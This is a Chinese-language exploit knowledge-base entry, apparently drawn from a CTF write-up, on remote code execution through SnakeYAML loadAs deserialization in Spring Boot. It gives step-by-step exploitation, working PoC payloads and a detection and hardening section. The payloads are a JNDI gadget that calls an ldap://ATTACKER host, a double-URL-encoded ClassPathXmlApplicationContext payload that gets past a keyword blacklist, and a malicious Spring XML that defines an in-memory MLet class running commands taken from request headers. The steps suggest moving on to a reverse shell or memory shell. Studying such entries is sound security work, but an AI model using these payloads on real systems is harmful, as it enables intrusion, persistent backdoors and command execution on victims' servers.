---
id: web-java-deserialization-snakeyaml-loadas-blacklist-double-encode-file-xml
title: Spring Boot SnakeYAML loadAs 黑名单双重 URL 编码绕过：JNDI 出网与 file:// 加载 multipart 临时 XML 无出网利用
type: scenario
domain: web
path: web/java/deserialization
technique: snakeyaml-loadas-blacklist-double-urlencode-jndi-file-xml
aliases:
- SnakeYAML 反序列化
- yamlContent loadAs
- SnakeYAML 黑名单绕过
- 双重 URL 编码绕过 ClassPath 黑名单
- ClassPathXmlApplicationContext file 临时文件
- Spring multipart 临时 XML 无出网利用
- MLet defineClass 内存马
- PropertyPathFactoryBean JNDI
tags:
- java
- spring-boot
- snakeyaml
- deserialization
- yaml
- blacklist-bypass
- double-url-encoding
- jndi
- file-protocol
- multipart
- mlet
- no-egress
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V242
  verified_at: '2026-11-07T12:54:33+08:00'
  notes: 已对照原文 web_ezyaml 段与 img/02-04 核对：/yaml 的 loadAs、四项黑名单、PropertyPathFactoryBean+SimpleJndiBeanFactory JNDI、双重 URL 编码绕过、ClassPathXmlApplicationContext 的 file://${catalina.home}/**/*.tmp 与 multipart 临时 XML、MLet defineClass/newInstance 均一致；原文依赖 SnakeYAML 1.33 但未给受影响区间，affected_versions 保持为空；未在真实环境复跑。
---

## 一句话结论

Spring Boot 控制器把用户提交的 `yamlContent` 交给 `new Yaml().loadAs(yamlContent, Object.class)`，仅用 `ClassPath`、`DataSource`、`URLClassLoader`、`ScriptEngine` 等关键字做子串黑名单；可用 `!!org.springframework.beans.factory.config.PropertyPathFactoryBean` + `SimpleJndiBeanFactory` 走 JNDI 执行命令，把 `ClassPathXmlApplicationContext` 标签做双重 URL 编码即可绕过黑名单；目标不出网时，改用 `file://${catalina.home}/**/*.tmp` 加载上传的 multipart 临时 XML，再借 MLet `defineClass` 加载内存字节码，实现无出网命令执行。

## 原理

- **入口**：`POST /yaml`，参数 `yamlContent`；代码 `Yaml yaml = new Yaml(); yaml.loadAs(yamlContent, Object.class)`。SnakeYAML 1.33 默认构造器允许 `!!` 全局标签，会按标签实例化任意类并设置属性，属于反序列化型 RCE。
- **黑名单**：`{"ClassPath","DataSource","URLClassLoader","ScriptEngine"}`，对原始 `yamlContent` 做 `contains` 子串检查。它只覆盖少量类名，且**在 URL 解码后的字符串上做字面匹配**。
- **JNDI 链（出网可用）**：
  ```yaml
  !!org.springframework.beans.factory.config.PropertyPathFactoryBean
   targetBeanName: "ldap://attacker:1389/Basic/Command/xxx"
   propertyPath: any
   beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
    shareableResources: ["ldap://attacker:1389/Basic/Command/xxx"]
  ```
  `PropertyPathFactoryBean` 触发 `SimpleJndiBeanFactory` 对 `ldap://` 资源做 JNDI lookup，加载远程 `Reference`/工厂类执行命令。该 payload 不含黑名单关键字，直接通过。
- **双重 URL 编码绕过**：`ClassPathXmlApplicationContext` 含黑名单词 `ClassPath`。把标签中的字符先做一次百分号编码（如 `C` → `%43`），再整体作为请求参数编码一次（`%` → `%25`）。Spring 解码一次后黑名单看到的是 `%43%6c%61%73%73...` 而非 `ClassPath`，检查通过；SnakeYAML 解析标签时再得到真实类名。原文验证该方式可让黑名单形同虚设。
- **无出网利用**：`!!org.springframework.context.support.ClassPathXmlApplicationContext ["file://${catalina.home}/**/*.tmp"]` 用 `file://` 加载本地文件作为 Spring XML。Spring Boot 的 multipart 上传文件会落到 `${catalina.home}` 下的临时目录（`tomcat.*` 工作目录），攻击者先在同一次 multipart 请求中把恶意 `beans.xml` 作为文件上传，再让 `ClassPathXmlApplicationContext` 以通配路径加载该临时文件，无需目标访问外网。
- **内存执行**：恶意 XML 用 `MethodInvokingFactoryBean` 调 `DatatypeConverter.parseBase64Binary` 解码一段 class 字节，再用 `javax.management.loading.MLet#defineClass` + `newInstance` 在目标进程内定义并实例化该类；类构造时读取请求头（如 `X-Authorization`）中的 base64 命令并执行，形成无文件落地、以 HTTP 请求驱动的内存命令通道。

## 触发条件

- 应用使用 SnakeYAML 1.x 默认 `Yaml` 构造器解析用户可控 YAML（`load`/`loadAs`），且仅靠关键字黑名单防护。
- `/yaml` 等入口可达，请求参数会被 URL 解码后传入解析器。
- JNDI 变体要求目标能访问攻击者 LDAP/RMI 服务；无出网变体要求目标存在可写 multipart 临时目录，且 `ClassPathXmlApplicationContext` 可用（Spring 上下文依赖在 classpath）。
- 无出网变体还需要攻击者能控制 multipart 文件名/内容，并能预测或通配匹配临时文件路径。

## 利用步骤

1. 确认 `/yaml` 接受 `yamlContent`，先提交简单 `!!` 标签观察报错/类加载行为，确认 SnakeYAML 未启用安全构造器。
2. 出网场景：在 VPS 启动 LDAP/RMI 恶意服务，提交 `PropertyPathFactoryBean` payload，观察命令执行。
3. 目标不出网时：准备恶意 Spring XML（`MethodInvokingFactoryBean` 解码 base64 class + `MLet#defineClass` + `newInstance`），在同一次 multipart 请求中作为文件上传，落到 Tomcat 临时目录。
4. 构造 `ClassPathXmlApplicationContext` 的 `file://${catalina.home}/**/*.tmp` payload，对 `ClassPath` 等关键字做双重 URL 编码，作为 `yamlContent` 提交。
5. 目标加载临时 XML 后实例化内存类；携带 `X-Authorization: <base64 命令>` 请求任意路由，类从请求头取命令执行并回显。
6. 验证命令输出（原文返回 `uid=0(...) gid=0`），随后可替换为反弹 Shell 或内存马。

## PoC

出网 JNDI 变体：

```yaml
!!org.springframework.beans.factory.config.PropertyPathFactoryBean
 targetBeanName: "ldap://ATTACKER:1389/Basic/Command/calc"
 propertyPath: x
 beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
  shareableResources: ["ldap://ATTACKER:1389/Basic/Command/calc"]
```

无出网 file:// 变体（`yamlContent` 需整体 URL 编码，关键类名再做一次编码）：

```text
!!org.springframework.context.support.%43%6c%61%73%73%50%61%74%68XmlApplicationContext ["file://${catalina.home}/**/*.tmp"]
```

恶意 Spring XML 的关键结构（class 字节 base64 省略）：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
    <property name="arguments"><list><value>BASE64_CLASS_BYTES</value></list></property>
  </bean>
  <bean id="classLoader" class="javax.management.loading.MLet"/>
  <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
    <constructor-arg ref="decoder"/>
    <constructor-arg type="int" value="0"/>
    <constructor-arg type="int" value="CLASS_LENGTH"/>
  </bean>
  <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
```

## 变体与关联

- 变体：`!!javax.script.ScriptEngineManager` + `!!java.net.URLClassLoader` 远程加载 JAR（本环境黑名单已覆盖，需换编码/其他 gadget）。
- 变体：`!!com.sun.rowset.JdbcRowSetImpl` 触发 JNDI；`!!org.springframework.aop...` 等 Spring 链。
- 变体：无出网时除 `file://` 外，也可用 `jar:`、`classpath:` 或本地 multipart 临时文件路径直接加载；MLet 可换成 `TemplatesImpl`/`URLClassLoader` 等内存马方式。
- 关联：TarzanCMS 主题包 SnakeYAML 1.27 链 [[web-java-deser-tarzancms-snakeyaml-scriptenginemanager-rce]]；JNDI 注入 [[web-java-deser-spring-aop-aspectjaroundadvice-priorityqueue-jndi]]；multipart 临时文件与 Spring XML 链 [[web-java-component-h2-console-postgres-loggerfile-ascii-jar-spring-xml-rce]]。
- 边界：使用 `SafeConstructor`/`LoaderOptions` 限制全局标签、升级 SnakeYAML、移除 Spring 上下文依赖、禁用 `file://` 与 JNDI、临时目录不可写或无法通配匹配时，利用失败。

## 检测与防御

- 检测：请求体/参数出现 `!!` 全局标签、`org.springframework`、`ClassPathXmlApplicationContext`、`PropertyPathFactoryBean`、`SimpleJndiBeanFactory`、`ldap://`、`file://`、`%25` 双重编码痕迹；应用异常加载 `file:` 路径或访问 LDAP/RMI 外连；Tomcat 临时目录出现 Spring XML。
- 修复：使用 `new Yaml(new SafeConstructor())` 或 `LoaderOptions` 只允许基础类型；禁止 `!!` 自定义标签；升级 SnakeYAML 至安全版本。
- 加固：移除不必要的 Spring 上下文/JNDI 依赖；禁用 `file://`、`jar:` 等协议与远程类加载；限制 multipart 临时目录权限并定期清理；对 YAML 接口做鉴权与内容白名单。
